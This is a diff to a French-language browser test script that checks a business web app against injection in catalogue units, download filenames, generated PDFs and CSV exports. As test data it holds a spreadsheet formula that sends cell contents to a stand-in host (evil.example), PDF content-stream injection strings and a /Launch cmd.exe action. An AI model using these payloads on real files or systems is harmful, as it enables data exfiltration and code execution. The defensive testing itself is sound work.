@@ -53,8 +53,8 @@ const FORMULE = '=HYPERLINK("https://evil.example/?d="&A2;"Voir la facture")';
   L.v('population : des produits portant une charge ou une formule sont dans le catalogue', Object.keys(A.x).length >= 3, A.x);
   L.v('aucun prix infini, négatif ou absurde (> 10 000 000) n\'est entré dans le catalogue', A.pas.length === 0, A.pas.slice(0, 5));
   L.v('le nom d\'un article reste borné (≤ 500 caractères) : le plus long vaut ' + A.maxNom, A.maxNom <= 500, A.maxNom);
-  const unites = Object.values(A.x).filter(x => /¤n\d+¤/.test(x.u) || /^[=+@-]/.test(x.u));
-  L.v('l\'unité venue du fichier est une unité (courte, sans balise ni formule) — sinon elle atteint le Stock brute : ' + JSON.stringify(unites.map(x => x.u.slice(0, 18))), unites.length === 0, unites.slice(0, 3));
+  const unites = Object.values(A.x).filter(x => x.u && !/^[\p{L}\p{N}\/².³°µ%. -]{1,12}$/u.test(x.u));
+  L.v('l\'unité venue du fichier est une unité (12 signes au plus : lettres, chiffres, / ² ³ ° µ % . -) — sinon elle atteint le Stock brute (injection-02) : ' + JSON.stringify(unites.map(x => x.u.slice(0, 18))), unites.length === 0, unites.slice(0, 3));
   // balayage : tous les écrans qui montrent le catalogue
   const routes = await p.evaluate(() => Object.keys(vues()).filter(r => !/-x-/.test(r)));
   const trouves = new Map(), vusT = new Set(); let nEcrans = 0;
@@ -73,14 +73,26 @@ const FORMULE = '=HYPERLINK("https://evil.example/?d="&A2;"Voir la facture")';
   const SR = "document.querySelector('#courrier-hote [data-opcourrier]').shadowRoot", propos = [];
   for (let i = 0; i < NOMS.length; i++) {
     await p.evaluate(id => COURRIER.inst.ouvrir(id), 'nf' + i); await p.waitForTimeout(500);
-    const dl = p.waitForEvent('download', { timeout: 6000 }).catch(() => null);
-    const clic = await p.evaluate(`(() => { const b = ${SR}.querySelector('.attbar [data-dl]'); if (!b) return false; b.click(); return true; })()`);
-    const d = await dl; propos.push({ i, clic, nom: d ? d.suggestedFilename() : null });
+    let d = null, clic = false;
+    for (let essai = 0; essai < 2 && !d; essai++) {   // la machine est partagée : un téléchargement qui tarde se REJOUE avant d'en conclure quoi que ce soit
+      const dl = p.waitForEvent('download', { timeout: 20000 }).catch(() => null);
+      clic = await p.evaluate(`(() => { const b = ${SR}.querySelector('.attbar [data-dl]'); if (!b) return false; b.click(); return true; })()`);
+      d = await dl; }
+    propos.push({ i, clic, nom: d ? d.suggestedFilename() : null });
   }
   console.log('  · noms proposés :', JSON.stringify(propos.map(x => x.nom && x.nom.slice(0, 50))));
   L.v('population : les ' + NOMS.length + ' pièces piégées ont été téléchargées (' + propos.filter(x => x.nom).length + ')', propos.filter(x => x.nom).length === NOMS.length, propos.filter(x => !x.nom));
   const mauvais = propos.filter(x => x.nom && (/[\\\/:*?"<>|]/.test(x.nom) || /[\u0000-\u001f\u007f-\u009f\u202a-\u202e\u2066-\u2069\u200b-\u200f]/.test(x.nom) || x.nom.length > 130 || /^\./.test(x.nom) || /^(con|prn|aux|nul)(\.|$)/i.test(x.nom) || /\s$/.test(x.nom)));
   L.v('chaque nom de fichier proposé est sûr : pas de chemin, de caractère de contrôle, de sens d\'écriture inversé, de nom réservé de Windows, ni plus de 130 signes', mauvais.length === 0, mauvais.map(x => x.nom.slice(0, 50)));
+  // ── 2 bis. le PDF fabriqué à partir d'un courriel (pièce « .pdf » téléchargée) : le texte d'un inconnu ne sort pas de sa chaîne PDF ──
+  const PDFT = await p.evaluate(() => { const lignes = ['a) Tj ET q 0 0 m 9999 9999 l S Q BT /F1 99 Tf (INJECTE', 'b\\) \\\\ ( \\( ))) (((', 'c\u0000\u0007\u001b[31m d', '/Launch /Action << /S /Launch /F (cmd.exe) >>'];
+    const octets = pdfUnePage('Titre ) Tj ET (piege', lignes); const t = typeof octets === 'string' ? octets : new TextDecoder('latin1').decode(octets);
+    const flux = t.split('\n').filter(l => /^BT /.test(l)), ok = /^BT \/F\d+ [\d.]+ Tf [\d. ]+ rg [\d.-]+ [\d.-]+ Td \((?:[^()\\\r\n]|\\.)*\) Tj ET$/, mauvaises = flux.filter(l => !ok.test(l));
+    return { n: flux.length, mauvaises: mauvaises.slice(0, 3), objets: (t.replace(/\((?:[^()\\]|\\.)*\)/g, '()').match(/\/Launch|\/JavaScript|\/JS |\/OpenAction|\/EmbeddedFile/g) || []).length };   /* hors des chaînes : un « /Launch » ÉCRIT dans un texte est inerte */ });
+  console.log('  · PDF fabriqué :', JSON.stringify(PDFT));
+  L.v('population : le PDF d\'essai contient des lignes de texte (' + PDFT.n + ')', PDFT.n >= 4, PDFT);
+  L.v('le texte piégé (parenthèses, barres obliques, caractères de contrôle) reste DANS sa chaîne PDF : chaque ligne est « BT … ( texte échappé ) Tj ET »', PDFT.mauvaises.length === 0, PDFT.mauvaises);
+  L.v('aucune action PDF (/Launch, /JavaScript, /OpenAction, /EmbeddedFile) n\'est née du texte', PDFT.objets === 0, PDFT);
   // ── 3. les exports : une valeur qui commence par = + - @ ──
   // 3a. la valeur hostile ARRIVE par un geste : « C'est un client » sur un courriel dont le nom d'expéditeur est une formule
   await p.evaluate(F => { MAILS.push(mlM('nExp', AUJ, '12:01', { nom: F, mail: 'formule@exemple.fr' }, 'Bonjour', 'Je souhaite un devis pour une climatisation. Tél. : 06 45 67 89 01')); }, FORMULE);
@@ -100,7 +112,7 @@ const FORMULE = '=HYPERLINK("https://evil.example/?d="&A2;"Voir la facture")';
   // 3c. les deux tableaux du module Véhicules
   const veh = await p.evaluate(async FORM => { const out = {}; const v = VEHICULES[0]; const q = [];
     const ancienNom = v.plaque; v.plaque = FORM;
-    const prises = []; const orig = URL.createObjectURL; URL.createObjectURL = b => { prises.push(b); return orig.call(URL, b); };
+    const prises = []; const orig = URL.createObjectURL; URL.createObjectURL = b => { prises.push(b); return orig.call(URL, b); }; out.diag = { fonctions: [typeof vhCsvFlotte, typeof vxCsv], vehicules: VEHICULES.length, v0: v && v.id };
     try { vhCsvFlotte(); } catch (e) { out.err = e.message; }
     try { v.frais = v.frais || []; v.frais.push([AUJ, FORM, 10]); vxCsv(v.id); } catch (e) { out.err2 = e.message; }
     URL.createObjectURL = orig; v.plaque = ancienNom; out.n = prises.length;
